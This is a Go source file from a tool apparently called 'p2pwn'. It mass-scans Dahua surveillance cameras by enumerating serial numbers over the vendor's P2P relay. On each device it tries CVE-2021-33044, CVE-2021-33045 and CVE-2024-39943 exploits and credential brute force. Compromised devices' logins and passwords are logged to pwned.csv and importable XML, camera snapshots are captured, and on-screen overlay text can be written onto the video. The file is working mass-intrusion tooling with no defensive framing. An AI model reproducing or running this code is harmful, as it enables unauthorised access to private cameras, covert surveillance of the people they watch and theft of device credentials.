package core

import (
	"fmt"
	"math"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/thebadinteger/p2pwn/core/p2p"
)

var (
	scanRed   = color.New(color.FgHiRed)
	scanGreen = color.New(color.FgGreen)
)

type Scanner struct {
	Targets     []string
	Config      *Config
	Threads     int
	OutDir      string
	InputSource string

	// Stats
	TotalCount     int64
	CompletedCount int64
	PwnedCount     int64
	OnlineCount    int64
	SafeCount      int64
	WasteCount     int64

	// Sync
	mu         sync.Mutex
	wg         sync.WaitGroup
	snapshotWg sync.WaitGroup
	cancelOnce sync.Once
	pwnedList  []ExploitResult
	cancelChan chan struct{}
}

func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string) *Scanner {
	return &Scanner{
		Targets:     targets,
		Config:      config,
		Threads:     threads,
		OutDir:      outDir,
		InputSource: inputSource,
		cancelChan:  make(chan struct{}),
	}
}

func (s *Scanner) Run() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		s.cancelOnce.Do(func() { close(s.cancelChan) })

		nowStr := time.Now().Format("15:04:05")
		fmt.Printf("\r\n")
		scanRed.Printf("[%s] Interrupted\n", nowStr)

		os.Exit(0)
	}()

	ranges, err := ParseGenerateRanges(s.Config.Scan.Generate)
	if err != nil {
		ranges = []Range{{0, 1048576}}
	}

	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	nurses := 20
	if val, err := getIntValue(s.Config.Scan.Nurses); err == nil {
		nurses = val
	}

	var total int64 = 0
	for _, target := range s.Targets {
		if len(target) == 10 {
			for _, r := range ranges {
				total += int64(r.End - r.Start)
			}
		} else if len(target) == 15 {
			total++
		}
	}
	s.TotalCount = total

	nowStr := time.Now().Format("15:04:05")
	scanRed.Printf("[%s] p2pwn\n", nowStr)
	fmt.Printf("[input] > %s\n", s.InputSource)
	fmt.Printf("[count] > %d\n", s.TotalCount)
	fmt.Printf("[output] > %s\n", s.OutDir)
	fmt.Printf("[threads] > %d\n", s.Threads)
	fmt.Printf("[config] > %s\n\n", s.Config.Path)

	os.MkdirAll(s.OutDir, 0755)
	s.writePwnedStart()

	type onlineResult struct {
		serial string
		client *p2p.DHClient
	}

	onlineChan := make(chan onlineResult, s.Threads*2)
	handshakeChan := make(chan string, nurses*2)

	go func() {
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-s.cancelChan:
				return
			case <-ticker.C:
				s.printProgress()
			}
		}
	}()

	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			for item := range onlineChan {
				s.processOnlineClient(item.serial, item.client)
			}
		}()
	}

	var nurseWg sync.WaitGroup
	for i := 0; i < nurses; i++ {
		nurseWg.Add(1)
		go func() {
			defer nurseWg.Done()
			for serial := range handshakeChan {
				if !p2p.CheckOnline(serial) {
					s.mu.Lock()
					s.WasteCount++
					s.CompletedCount++
					s.mu.Unlock()
					continue
				}
				var ok bool
				var finalClient *p2p.DHClient
				var requiresType1 bool

				var lastErr error
				for attempt := 0; attempt < retries; attempt++ {
					client := p2p.NewDHClient(serial)
					client.SetRetries(retries)
					err := client.Handshake()
					lastErr = err
					if err == nil {
						// type0 success. skip type1
						finalClient = client
						ok = true
						break
					}
					client.Close()
					if p2p.IsChannelAuthRequired(err) {
						requiresType1 = true
						break // break to type1
					}
				}

				// all attempts failed, assume type1
				if !ok && !requiresType1 && lastErr != nil {
					if strings.Contains(lastErr.Error(), "timeout") || strings.Contains(lastErr.Error(), "no response") {
						requiresType1 = true
					}
				}

				if !ok && requiresType1 {
					if probe := tryType0Tunnel(serial, retries); probe != nil {
						finalClient = probe
						ok = true
					} else {
						if !s.Config.Pwn.Protocol["type1"] {
							s.mu.Lock()
							s.OnlineCount++
							s.CompletedCount++
							s.mu.Unlock()
							continue
						}

						if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Credentials) > 0 {
							type1Delay := 0
							if val, err := getIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
								type1Delay = val
							}
							for _, cred := range s.Config.Brute.Credentials {
								if type1Delay > 0 {
									time.Sleep(time.Duration(type1Delay) * time.Second)
								}
								authClient := p2p.NewDHClient(serial)
								authClient.SetRetries(retries)
								authClient.SetDeviceAuth(cred.Login, cred.Password, "")
								authErr := authClient.Handshake()
								if authErr == nil {
									finalClient = authClient
									ok = true
									break
								}
								authClient.Close()
							}
						}
					}
				}

				if ok && finalClient != nil {
					s.mu.Lock()
					s.OnlineCount++
					s.mu.Unlock()
					onlineChan <- onlineResult{serial: serial, client: finalClient}
				} else {
					s.mu.Lock()
					s.WasteCount++
					s.CompletedCount++
					s.mu.Unlock()
				}
			}
		}()
	}

	for _, target := range s.Targets {
		if len(target) == 15 {
			select {
			case <-s.cancelChan:
				goto cleanup
			default:
			}
			handshakeChan <- target
		} else if len(target) == 10 {
			for _, r := range ranges {
				for i := r.Start; i < r.End; i++ {
					select {
					case <-s.cancelChan:
						goto cleanup
					default:
					}
					suffix := fmt.Sprintf("%05X", i)
					handshakeChan <- target + suffix
				}
			}
		}
	}

cleanup:
	close(handshakeChan)
	nurseWg.Wait()
	close(onlineChan)
	s.wg.Wait()
	s.snapshotWg.Wait()
	s.cancelOnce.Do(func() { close(s.cancelChan) })
	s.printProgress()
	fmt.Println()

	doneTimeStr := time.Now().Format("15:04:05")
	scanGreen.Printf("[%s] Done\n", doneTimeStr)
}

func tryType0Tunnel(serial string, retries int) *p2p.DHClient {
	client := p2p.NewDHClient(serial)
	client.SetRetries(retries)
	if err := client.Handshake(); err != nil {
		client.Close()
		return nil
	}
	if err := client.EstablishDirectP2P(); err != nil {
		if err = client.CompleteRelayHandshake(); err != nil {
			client.Close()
			return nil
		}
	}
	return client
}

func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	for attempt := 0; attempt < retries; attempt++ {
		directOK := true
		err := client.EstablishDirectP2P()
		if err != nil {
			directOK = false
			err = client.CompleteRelayHandshake()
		}
		if err != nil {
			continue
		}

		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)

		var tunnel *p2p.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}

		s.processExploit(serial, client, tunnel, directOK)
		go func(tunnel *p2p.PTCPTunnel, stopHB chan struct{}, client *p2p.DHClient) {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}(tunnel, stopHB, client)
		return
	}

	client.Close()
	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
}

func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool) {
	reopenVerifiedTunnel := func(res *ExploitResult) (*p2p.PTCPTunnel, bool) {
		if res == nil || (res.Method != "cve-2021-33044" && res.Method != "cve-2021-33045") || res.Login == "" || res.Password == "" {
			return tunnel, false
		}
		tunnel.Disconnect()

		var fresh *p2p.PTCPTunnel
		if directOK {
			fresh = client.NewDirectTunnel()
		} else {
			fresh = client.NewTunnel()
		}
		fresh.SetAuth(res.Login, res.Password)
		if model, channels, _, err := fresh.GetDeviceInfo(); err == nil && model != "" {
			res.Model = model
			res.Channels = channels
			return fresh, true
		}
		sdk := p2p.NewSDKClient(fresh, res.Login, res.Password)
		if _, model, channels, err := sdk.GetDeviceInfo(); err == nil {
			if model != "" {
				res.Model = model
			}
			if channels > 0 {
				res.Channels = channels
			}
		}
		return fresh, true
	}

	ip := ""
	remoteAddr := client.GetDeviceAddr()
	if remoteAddr != "" {
		if idx := strings.Index(remoteAddr, ":"); idx > 0 {
			ip = remoteAddr[:idx]
		} else {
			ip = remoteAddr
		}
	}

	// device was already authenticated, collect info and save
	if client.IsPwnedAuth() {
		user, pass, _, _ := client.GetDeviceAuth()
		tunnel.SetAuth(user, pass)

		model, channels, _, err := tunnel.GetDeviceInfo()
		if err != nil || model == "" {
			sdk := p2p.NewSDKClient(tunnel, user, pass)
			if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
				if m != "" {
					model = m
				}
				if ch > 0 {
					channels = ch
				}
			}
		}
		if model == "" {
			model = "Dahua Device"
		}
		if channels == 0 {
			channels = 1
		}
		res := &ExploitResult{
			Method:   "type1",
			Login:    user,
			Password: pass,
			Model:    model,
			Channels: channels,
			IP:       ip,
		}
		s.handlePwned(serial, res)
		s.applyOSD(serial, tunnel, res)
		if !s.launchSnapshot(serial, res) {
			s.mu.Lock()
			s.CompletedCount++
			s.mu.Unlock()
		}
		return
	}

	// CVE exploits
	if s.Config.Pwn.Protocol["cgi"] {
		if s.Config.Pwn.Methods["cve-2021-33044"] {
			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if err == nil && res != nil && res.Password != "" {
				activeTunnel, fresh := reopenVerifiedTunnel(res)
				if fresh {
					go activeTunnel.Disconnect()
				}
				res.IP = ip
				s.handlePwned(serial, res)
				s.applyOSD(serial, tunnel, res)
				if !s.launchSnapshot(serial, res) {
					s.mu.Lock()
					s.CompletedCount++
					s.mu.Unlock()
				}
				return
			}
		}

		if s.Config.Pwn.Methods["cve-2021-33045"] {
			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if err == nil && res != nil && res.Password != "" {
				activeTunnel, fresh := reopenVerifiedTunnel(res)
				if fresh {
					go activeTunnel.Disconnect()
				}
				res.IP = ip
				s.handlePwned(serial, res)
				s.applyOSD(serial, tunnel, res)
				if !s.launchSnapshot(serial, res) {
					s.mu.Lock()
					s.CompletedCount++
					s.mu.Unlock()
				}
				return
			}
		}

		if s.Config.Pwn.Methods["cve-2024-39943"] {
			res, err := TryCVE2024_39943(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
			if err == nil && res != nil {
				res.IP = ip
				s.handlePwned(serial, res)
				s.applyOSD(serial, tunnel, res)
				if !s.launchSnapshot(serial, res) {
					s.mu.Lock()
					s.CompletedCount++
					s.mu.Unlock()
				}
				return
			}
		}

		if s.Config.Pwn.Methods["brute"] {
			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials)
			if err == nil && res != nil {
				res.IP = ip
				s.handlePwned(serial, res)
				s.applyOSD(serial, tunnel, res)
				if !s.launchSnapshot(serial, res) {
					s.mu.Lock()
					s.CompletedCount++
					s.mu.Unlock()
				}
				return
			}
		}
	}

	runSDK := s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"]
	if runSDK && s.Config.Pwn.Protocol["cgi"] {
		if model, _, _, _ := tunnel.GetDeviceInfo(); model != "" {
			runSDK = false
		}
	}
	if runSDK {
		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials)
		if err == nil && res != nil {
			res.IP = ip
			s.handlePwned(serial, res)
			s.applyOSD(serial, tunnel, res)
			if !s.launchSnapshot(serial, res) {
				s.mu.Lock()
				s.CompletedCount++
				s.mu.Unlock()
			}
			return
		}
	}

	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
}

func (s *Scanner) dialFreshTunnel(serial string, res *ExploitResult) (*p2p.PTCPTunnel, func(), bool) {
	retries := 3
	if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}
	login, pass := res.Login, res.Password
	isType1 := res.Method == "type1"
	for attempt := 0; attempt < retries; attempt++ {
		client := p2p.NewDHClient(serial)
		client.SetRetries(retries)
		if isType1 {
			client.SetDeviceAuth(login, pass, "")
		}
		if err := client.Handshake(); err != nil {
			client.Close()
			if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && pass != "" {
				client = p2p.NewDHClient(serial)
				client.SetRetries(retries)
				client.SetDeviceAuth(login, pass, "")
				if err := client.Handshake(); err != nil {
					client.Close()
					continue
				}
			} else {
				continue
			}
		}
		directOK := true
		if err := client.EstablishDirectP2P(); err != nil {
			directOK = false
			if err = client.CompleteRelayHandshake(); err != nil {
				client.Close()
				continue
			}
		}
		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)
		var tunnel *p2p.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}
		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}
		return tunnel, cleanup, true
	}
	return nil, nil, false
}

func (s *Scanner) applyOSD(serial string, tunnel *p2p.PTCPTunnel, res *ExploitResult) {
	if !s.Config.Overlay.Osd {
		return
	}
	if res == nil || res.Login == "" || res.Password == "" {
		return
	}
	channel := normalizeOSDChannel(s.Config.Overlay.Channel)
	lines := normalizeOSDLines(s.Config.Overlay.Custom)
	if channel == "" && len(lines) == 0 {
		return
	}
	redial := func() (*p2p.PTCPTunnel, func(), bool) {
		return s.dialFreshTunnel(serial, res)
	}
	if err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial); err != nil {
		return
	}
}

func (s *Scanner) launchSnapshot(serial string, res *ExploitResult) bool {
	if !s.Config.Pwn.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
		return false
	}

	method := res.Method
	login := res.Login
	password := res.Password
	channels := res.Channels
	model := res.Model

	s.snapshotWg.Add(1)
	go func() {
		defer s.snapshotWg.Done()
		defer func() {
			s.mu.Lock()
			s.CompletedCount++
			s.mu.Unlock()
		}()

		retries := 3
		if val, err := getIntValue(s.Config.Scan.Retries); err == nil {
			retries = val
		}

		for attempt := 0; attempt < retries; attempt++ {
			client := p2p.NewDHClient(serial)
			client.SetRetries(retries)

			isType1 := (method == "type1")
			if isType1 {
				client.SetDeviceAuth(login, password, "")
			}

			if err := client.Handshake(); err != nil {
				client.Close()
				if !isType1 && p2p.IsChannelAuthRequired(err) && login != "" && password != "" {
					client = p2p.NewDHClient(serial)
					client.SetRetries(retries)
					client.SetDeviceAuth(login, password, "")

					if err := client.Handshake(); err != nil {
						client.Close()
						continue
					}
				} else {
					continue
				}
			}
			directOK := true
			if err := client.EstablishDirectP2P(); err != nil {
				directOK = false
				if err = client.CompleteRelayHandshake(); err != nil {
					client.Close()
					continue
				}
			}

			stopHB := make(chan struct{})
			client.StartHeartbeat(stopHB)

			var tunnel *p2p.PTCPTunnel
			if directOK {
				tunnel = client.NewDirectTunnel()
			} else {
				tunnel = client.NewTunnel()
			}

			snapshotOK := false
			for snapshotAttempt := 0; snapshotAttempt < retries; snapshotAttempt++ {
				if CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model) {
					snapshotOK = true
					break
				}
			}
			if snapshotOK {
				go func(tunnel *p2p.PTCPTunnel, stopHB chan struct{}, client *p2p.DHClient) {
					tunnel.Disconnect()
					close(stopHB)
					client.Close()
				}(tunnel, stopHB, client)
				return
			}
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
			continue
		}
	}()
	return true
}

func (s *Scanner) handlePwned(serial string, res *ExploitResult) {
	s.mu.Lock()
	s.PwnedCount++
	s.pwnedList = append(s.pwnedList, *res)

	// Append to pwned.csv
	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		line := fmt.Sprintf("%s,%s,%s,%s,%d,%s,%s\n",
			csvField(serial), csvField(res.Model), csvField(res.Login), csvField(res.Password),
			res.Channels, csvField(res.IP), csvField(res.Method))
		f.WriteString(line)
		f.Close()
	}

	// Save to import_*.xml
	s.writeXMLFiles(serial, res)
	s.mu.Unlock()
}

func csvField(s string) string {
	if strings.ContainsAny(s, "\",\n\r") {
		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
	}
	return s
}

func (s *Scanner) writeXMLFiles(serial string, res *ExploitResult) {
	pwnedIdx := len(s.pwnedList) - 1
	chunkSize := 64
	chunkIdx := pwnedIdx / chunkSize
	xmlFilename := fmt.Sprintf("import_%d.xml", chunkIdx+1)
	xmlPath := filepath.Join(s.OutDir, xmlFilename)

	encPass := FastEnc(res.Password)
	row := BuildDeviceXMLRow(serial, res.Login, encPass)

	if _, err := os.Stat(xmlPath); os.IsNotExist(err) {
		var sb strings.Builder
		sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
		sb.WriteString("<DeviceManager version=\"2.0\">\n")
		sb.WriteString(row)
		sb.WriteString("</DeviceManager>\n")
		os.WriteFile(xmlPath, []byte(sb.String()), 0644)
	} else {
		data, err := os.ReadFile(xmlPath)
		if err != nil {
			// Corrupted or unreadable
			var sb strings.Builder
			sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
			sb.WriteString("<DeviceManager version=\"2.0\">\n")
			sb.WriteString(row)
			sb.WriteString("</DeviceManager>\n")
			os.WriteFile(xmlPath, []byte(sb.String()), 0644)
			return
		}
		content := strings.TrimSuffix(string(data), "</DeviceManager>\n")
		content += row + "</DeviceManager>\n"
		os.WriteFile(xmlPath, []byte(content), 0644)
	}
}

func (s *Scanner) writePwnedStart() {
	pwnedFile := filepath.Join(s.OutDir, "pwned.csv")
	needHeader := false
	if st, err := os.Stat(pwnedFile); os.IsNotExist(err) || st.Size() == 0 {
		needHeader = true
	}
	f, err := os.OpenFile(pwnedFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		if needHeader {
			f.WriteString("sn,model,login,password,channels,ip,vuln\n")
		}
		f.Close()
	}
}

func (s *Scanner) printProgress() {
	s.mu.Lock()
	defer s.mu.Unlock()

	var pct float64 = 0.0
	if s.TotalCount > 0 {
		pct = (float64(s.CompletedCount) / float64(s.TotalCount)) * 100.0
	}

	var pctStr string
	if s.CompletedCount >= s.TotalCount {
		pctStr = "100%"
	} else {
		pct = math.Floor(pct*10) / 10
		pctStr = fmt.Sprintf("%.1f%%", pct)
	}

	line := fmt.Sprintf("[%s] pwned > %d | online > %d | waste > %d",
		pctStr, s.PwnedCount, s.OnlineCount, s.WasteCount)
	fmt.Printf("\033[2K\r%s", line)
}
